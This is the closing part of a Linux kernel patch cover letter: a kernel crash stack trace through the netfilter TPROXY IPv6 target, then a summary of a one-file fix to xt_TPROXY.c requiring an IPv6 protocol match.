[  365.321423][    C0]  ? memcg_alloc_abort_single+0xc0/0x320
[  365.322301][    C0]  ? icmpv6_rcv+0x97f/0x1530
[  365.323172][    C0]  ? ip6_protocol_deliver_rcu+0xb97/0x12e0
[  365.324100][    C0]  ? ip6_input_finish+0x14b/0x1f0
[  365.325051][    C0]  ? ip6_input+0x1d4/0x200
[  365.325762][    C0]  ? ipv6_rcv+0x327/0x460
[  365.326611][    C0]  ? __netif_receive_skb_one_core+0x11a/0x1b0
[  365.327548][    C0]  ? process_backlog+0x33c/0xf00
[  365.328377][    C0]  ? __napi_poll.constprop.0+0xa7/0x580
[  365.329152][    C0]  ? net_rx_action+0x4d4/0xc70
[  365.330228][    C0]  ? handle_softirqs+0x282/0x7d0
[  365.331304][    C0]  ? do_softirq.part.0+0x3f/0xa0
[  365.332272][    C0]  ? __local_bh_enable_ip+0x79/0x80
[  365.333235][    C0]  tproxy_tg6_v1+0x2ea/0xbc0
[  365.333980][    C0]  ? __pfx_tproxy_tg6_v1+0x10/0x10
[  365.334705][    C0]  ip6t_do_table+0x9bc/0x1ae0
[  365.335355][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.336110][    C0]  ? nf_ct_frag6_gather+0x314/0x26a0
[  365.336932][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.337701][    C0]  ? find_held_lock+0x34/0x120
[  365.338525][    C0]  ? __pfx_ip6t_do_table+0x10/0x10
[  365.339304][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.340318][    C0]  ? __pfx_nf_ct_frag6_gather+0x10/0x10
[  365.341176][    C0]  ? lock_release+0x687/0xc90
[  365.341706][    C0]  ip6table_mangle_hook+0xaa/0x710
[  365.342250][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.342863][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.343452][    C0]  ? local_clock_noinstr+0x15/0xd0
[  365.344092][    C0]  ? __pfx_ip6table_mangle_hook+0x10/0x10
[  365.344873][    C0]  ? ipv6_defrag+0x197/0x3d0
[  365.345561][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.346213][    C0]  nf_hook_slow+0xa9/0x1e0
[  365.346879][    C0]  ipv6_rcv+0x16d/0x460
[  365.347455][    C0]  ? kasan_save_stack+0x42/0x60
[  365.348075][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  365.348759][    C0]  ? __kasan_slab_free+0x37/0x50
[  365.349332][    C0]  ? kmem_cache_free+0x1a5/0x570
[  365.350030][    C0]  ? rcu_core+0x706/0x1e50
[  365.350674][    C0]  ? __pfx_ip6_rcv_finish+0x10/0x10
[  365.351310][    C0]  ? find_held_lock+0x34/0x120
[  365.352007][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.352674][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.353412][    C0]  ? local_clock_noinstr+0x15/0xd0
[  365.354161][    C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  365.354804][    C0]  __netif_receive_skb_one_core+0x11a/0x1b0
[  365.355639][    C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  365.356527][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.357136][    C0]  ? process_backlog+0x309/0xf00
[  365.357872][    C0]  ? process_backlog+0x309/0xf00
[  365.358586][    C0]  ? process_backlog+0x309/0xf00
[  365.359227][    C0]  process_backlog+0x33c/0xf00
[  365.359995][    C0]  ? process_backlog+0x309/0xf00
[  365.360561][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.361333][    C0]  __napi_poll.constprop.0+0xa7/0x580
[  365.362133][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.362884][    C0]  net_rx_action+0x4d4/0xc70
[  365.363594][    C0]  ? __pfx_net_rx_action+0x10/0x10
[  365.364152][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.364964][    C0]  ? lock_release+0x687/0xc90
[  365.365582][    C0]  ? __pfx_lock_release+0x10/0x10
[  365.366348][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.366968][    C0]  ? ktime_get+0x6f/0x150
[  365.367633][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.368429][    C0]  handle_softirqs+0x282/0x7d0
[  365.369053][    C0]  ? __pfx_handle_softirqs+0x10/0x10
[  365.369892][    C0]  do_softirq.part.0+0x3f/0xa0
[  365.370430][    C0]  </IRQ>
[  365.370843][    C0]  <TASK>
[  365.371249][    C0]  __local_bh_enable_ip+0x79/0x80
[  365.372005][    C0]  __neigh_event_send+0x2ce/0x11c0
[  365.372689][    C0]  ? __lock_acquire.isra.0+0x5cb/0x1230
[  365.373534][    C0]  neigh_resolve_output+0x435/0x740
[  365.374110][    C0]  ? __pfx____neigh_create+0x10/0x10
[  365.374839][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.375658][    C0]  ip6_finish_output2+0x933/0x1c00
[  365.376319][    C0]  ? lock_release+0x687/0xc90
[  365.377060][    C0]  ? __pfx_ip6_finish_output2+0x10/0x10
[  365.377680][    C0]  ? lock_acquire+0x153/0x2f0
[  365.378361][    C0]  ? ip6_mtu+0x7e/0x240
[  365.378915][    C0]  ip6_finish_output+0x6af/0xd00
[  365.379595][    C0]  ip6_output+0x203/0x5f0
[  365.380222][    C0]  ? __pfx_ip6_output+0x10/0x10
[  365.380782][    C0]  ? ip6_setup_cork+0xa56/0x15a0
[  365.381466][    C0]  ? __pfx_ip6_finish_output+0x10/0x10
[  365.382314][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.383070][    C0]  ip6_send_skb+0xdc/0x290
[  365.383752][    C0]  rawv6_sendmsg+0x25d8/0x35a0
[  365.384285][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.385103][    C0]  ? __pfx_rawv6_sendmsg+0x10/0x10
[  365.385870][    C0]  ? release_sock+0x1f/0x180
[  365.386452][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.387316][    C0]  ? reacquire_held_locks+0x204/0x4b0
[  365.387988][    C0]  ? release_sock+0x1f/0x180
[  365.388673][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.389455][    C0]  ? aa_sk_perm+0x131/0x8a0
[  365.390040][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.390914][    C0]  ? __sys_sendto+0x361/0x3f0
[  365.391450][    C0]  __sys_sendto+0x361/0x3f0
[  365.392104][    C0]  ? __pfx___sys_sendto+0x10/0x10
[  365.392808][    C0]  ? __pfx_inet6_bind_sk+0x10/0x10
[  365.393345][    C0]  ? do_user_addr_fault+0x45b/0xbc0
[  365.394071][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.394900][    C0]  ? __sys_bind+0x169/0x200
[  365.395431][    C0]  __x64_sys_sendto+0xe0/0x1c0
[  365.396208][    C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  365.397005][    C0]  ? trace_hardirqs_on+0x5b/0x110
[  365.397620][    C0]  do_syscall_64+0x6f/0x150
[  365.398163][    C0]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[  365.399042][    C0] RIP: 0033:0x78ed10848687
[  365.399878][    C0] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  365.402184][    C0] RSP: 002b:00007ffff31d9530 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  365.403319][    C0] RAX: ffffffffffffffda RBX: 000078ed107b6740 RCX: 000078ed10848687
[  365.404538][    C0] RDX: 0000000000000010 RSI: 00007ffff31d9610 RDI: 0000000000000003
[  365.405447][    C0] RBP: 00007ffff31daee7 R08: 00007ffff31d95f0 R09: 000000000000001c
[  365.406537][    C0] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffff31daeed
[  365.407624][    C0] R13: 00007ffff31daefb R14: 00007ffff31d95f0 R15: 00005d018ed30dd8
[  365.408700][    C0]  </TASK>
[  365.410580][    C0] Kernel Offset: disabled
[  365.411050][    C0] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: xt_TPROXY: require IPv6 protocol match

 net/netfilter/xt_TPROXY.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

-- 
2.43.0
